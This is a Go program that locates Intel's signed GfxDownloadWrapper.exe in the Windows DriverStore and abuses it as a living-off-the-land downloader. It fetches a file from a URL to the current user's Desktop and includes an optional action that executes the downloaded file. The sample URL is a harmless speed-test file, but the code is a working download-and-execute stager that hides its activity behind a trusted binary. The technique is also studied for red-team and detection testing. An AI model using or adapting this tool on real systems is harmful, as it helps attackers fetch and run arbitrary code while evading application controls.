package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
)

func main() {
	// Define the regex to locate GfxDownloadWrapper.exe
	wrapperRegex := `(?i)GfxDownloadWrapper\.exe`
	searchPaths := []string{
		`C:\Windows\System32\DriverStore\FileRepository\`,
	}

	// Dynamically get the username
	currentUser, err := user.Current()
	if err != nil {
		fmt.Printf("Error retrieving current user: %v\n", err)
		return
	}
	// Extract only the username part
	username := currentUser.Username
	if idx := strings.LastIndex(username, `\`); idx != -1 {
		username = username[idx+1:]
	}
	fmt.Printf("Current user: %s\n", username)

	// File to download and its destination (dynamically update path with username)
	url := "https://ash-speed.hetzner.com/100MB.bin"
	destination := fmt.Sprintf(`C:\Users\%s\Desktop\100MB.bin`, username)

	// Search for GfxDownloadWrapper.exe
	wrapperPath := findWrapper(wrapperRegex, searchPaths)
	if wrapperPath == "" {
		fmt.Println("GfxDownloadWrapper.exe not found")
		return
	}

	// Execute GfxDownloadWrapper.exe with the desired parameters
	err = executeWrapper(wrapperPath, url, destination)
	if err != nil {
		fmt.Printf("Error executing GfxDownloadWrapper: %v\n", err)
		return
	}

	// Choose how to handle the file after download
	action := "leave" // Options: "leave", "run"

	switch action {
	case "leave":
		fmt.Println("File downloaded and left at the destination.")
	case "run":
		runDownloadedFile(destination)
	default:
		fmt.Println("Unknown action specified.")
	}
}

// findWrapper searches for GfxDownloadWrapper.exe in the specified paths
func findWrapper(regex string, paths []string) string {
	r, err := regexp.Compile(regex)
	if err != nil {
		fmt.Printf("Error compiling regex: %v\n", err)
		return ""
	}

	// Define the prefixes to check
	validPrefixes := []string{"cui", "igd", "ki", "k1", "64k"}

	for _, path := range paths {
		entries, err := os.ReadDir(path)
		if err != nil {
			fmt.Printf("Error reading directory %s: %v\n", path, err)
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				dirName := entry.Name()
				// Check if the directory name starts with any of the valid prefixes
				for _, prefix := range validPrefixes {
					if strings.HasPrefix(dirName, prefix) {
						subDirPath := path + dirName + `\`
						files, err := os.ReadDir(subDirPath)
						if err != nil {
							fmt.Printf("Error reading subdirectory %s: %v\n", subDirPath, err)
							continue
						}

						for _, file := range files {
							if !file.IsDir() && r.MatchString(file.Name()) {
								return subDirPath + file.Name()
							}
						}
					}
				}
			}
		}
	}

	return ""
}

// executeWrapper executes the GfxDownloadWrapper.exe with the download URL and destination
func executeWrapper(wrapperPath, url, destination string) error {
	cmd := exec.Command(wrapperPath, url, destination)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("Executing: %s %s %s\n", wrapperPath, url, destination)

	// Start the command without waiting for it to finish
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start command: %w", err)
	}

	return nil
}

// runDownloadedFile starts the downloaded file as a new process
func runDownloadedFile(filePath string) {
	fmt.Printf("Running downloaded file: %s\n", filePath)
	cmd := exec.Command(filePath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Start(); err != nil {
		fmt.Printf("Error running file: %v\n", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		fmt.Printf("Error waiting for file to finish: %v\n", err)
	}
}
